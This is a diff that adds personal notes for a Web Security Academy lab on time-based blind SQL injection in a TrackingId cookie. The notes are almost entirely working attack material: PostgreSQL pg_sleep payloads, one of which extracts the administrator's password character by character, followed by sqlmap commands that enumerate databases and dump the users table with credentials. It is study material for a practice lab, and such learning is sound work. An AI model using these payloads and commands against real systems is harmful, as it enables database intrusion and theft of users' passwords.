@@ -1,0 +1,29 @@
+// Time based SQL Injection attack  
+
+
+
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+
+x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, 1, 1)= 'a') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--
+
+
+
+solve using SQLMAP
+
+
+// Getting the name of the Database used
+
+sqlmap -u "https://0afb00ed031561608183668b00310082.web-security-academy.net/" --cookie="TrackingId=x" --level=3
+
+
+// Attacking the Database
+
+sqlmap -u "https://0afb00ed031561608183668b00310082.web-security-academy.net/" --cookie="TrackingId=x" --level=3 --dbs
+
+
+// SQLmap TrackingId cookie me SQL Injection karke
+public database ke users table ka
+complete data extract kar rahi hai and user data dump kar diya and we get user and password
+
+sqlmap -u "https://0afb00ed031561608183668b00310082.web-security-academy.net/" --cookie="TrackingId=x" --level=3 -D public -T users --dump
